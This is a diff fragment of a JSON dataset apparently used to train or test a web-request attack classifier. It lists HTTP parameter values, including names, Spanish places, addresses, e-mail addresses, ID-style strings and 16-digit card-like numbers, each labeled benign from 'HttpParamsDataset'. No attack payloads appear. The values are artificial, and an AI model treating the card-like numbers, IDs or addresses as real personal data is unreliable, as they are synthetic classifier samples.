+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "blondell3",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "peller@arvigar.gs",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "49135",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "escultrico",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "69634179t",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "6689689469452036",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "3318",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "salgado pladellorens",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "villadoz",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "8ienne2s6",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "horcajo de montemayor",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sensualmente",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "fabrizio",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ gravina, s/n",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "6453670410602968",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "iraola rudi",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "castellanos de zapardiel",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "tweddle",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sirevici",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "90230020p",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "6034871098442134",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "vingelli9@custombikesclothes.fr",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "fuentelmonge",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "m*ule38",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cimorra",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "knippenberg@soyriojano.cf",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "iza",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "martinn sampayo",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "calle plantio, 178,",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "benning",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sask",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "rudie@deuxmanagement.jo",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "guilas",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ramblizo",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "8043015940180984",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "6087",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "stoeckel@hacia.sa",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "tossa de mar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "rescisorio",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "valdemaluque",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "masahiro",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "humfrey",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "brines grimalda",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "calle hernan cortes, 58,",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "38i2t702",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ reina del cielo 136, 8-d",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "09ca93a4i9lar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "70p89c9cion958",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "drozdek.waechter@tarifasdevuelos.bj",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "villacastn",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "hans",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "30666350j",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "12965",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "vivie4",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "colosse@velaconsultores.gob",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "fuente de pedro naharro",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "inusitado",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "69557398q",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "beilul",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "hadel",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "brivio",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ansa-sobrarbe",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "rebalg1r",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "88426780z",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "34111",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "2268",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "47355557y",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "5393761266970595",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "leonila",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "49511678s",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "08191",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "rosoli",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  }
+]
